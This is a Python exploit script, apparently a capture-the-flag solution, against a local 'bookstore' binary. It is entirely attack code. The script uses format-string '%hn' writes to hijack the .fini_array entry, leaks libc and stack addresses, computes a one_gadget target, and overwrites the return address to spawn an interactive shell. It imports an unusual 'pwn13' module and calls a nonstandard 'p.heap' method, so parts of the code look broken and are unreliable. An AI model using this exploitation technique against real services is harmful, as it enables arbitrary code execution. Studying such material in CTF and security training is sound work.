#!/usr/bin/python
from pwn13 import *

main_addr = 0x400a39
fini_addr = 0x6011b8
free_got = 0x6013b8
#one_gadget
#0x4526a
#0xef6c4
#0xf0567
#libc+0x20830 = leak addr

def overwrite_fini():
    p.sendline("1")
    print p.recvuntil(":")
    p.sendline("a")
    print p.recvuntil("Submit\n")

    p.sendline("4")
    print p.recvuntil("Submit\n")
    p.heap(0, 0x500)

    payload = "1"*8
    payload += p64(fini_addr)
    p.sendline(payload)
    print p.recvuntil(":")

    payload = "a"*8 + "%2587c" + "%13$hn" + "%31$p" + "%33$p"
    payload += "a"*(136-len(payload))
    payload += p64(0x150)
    p.sendline(payload)

    print p.recvuntil("Submit\n")
    p.heap(0, 0x500)

    p.sendline("5")
    print p.recvuntil("0x")
    addr=int(p.recv(12),16)
    libc_base = addr - 0x20830
    print 'libc_base', hex(libc_base)

    print p.recvuntil("0x")
    addr=int(p.recv(12),16)
    ret_addr = addr - 496
    args_addr = ret_addr + 0x78
    print 'ret_addr', hex(ret_addr)
    print 'args_addr', hex(args_addr)



    ################################
    #onegadget = libc_base + 0x4526a
    #onegadget = libc_base + 0xef6c4
    onegadget = libc_base + 0xf0567
    p.sendline("4")
    print p.recvuntil("Submit\n")
    payload = "1"*8
    payload += p64(args_addr+4)
    payload += p64(ret_addr)
    payload += p64(ret_addr+2)
    p.sendline(payload)
    print p.recvuntil(":")

    a1 = str(int(hex(onegadget)[-4:],16))
    a2 = str(int("2"+hex(onegadget)[-8:-4],16)-int(a1)-65536)
    print hex(onegadget)
    print a1, hex(int(a1))
    print a2, hex(int(a2))
    payload = "A"*51 +"%65511c" + "%13$hn" +"%"+a1+"c"+ "%14$hn" + "%"+a2+"c"+ "%15$hn" 
    payload += "\x00"*(136-len(payload))
    payload += p64(0x150)
    p.sendline(payload)
    print p.recvuntil("Submit\n")
    p.sendline("5")
    p.interactive()

if __name__ == "__main__":
    p = process("./bookstore")

    print p.recvuntil("Submit\n")

    overwrite_fini()


    p.close()
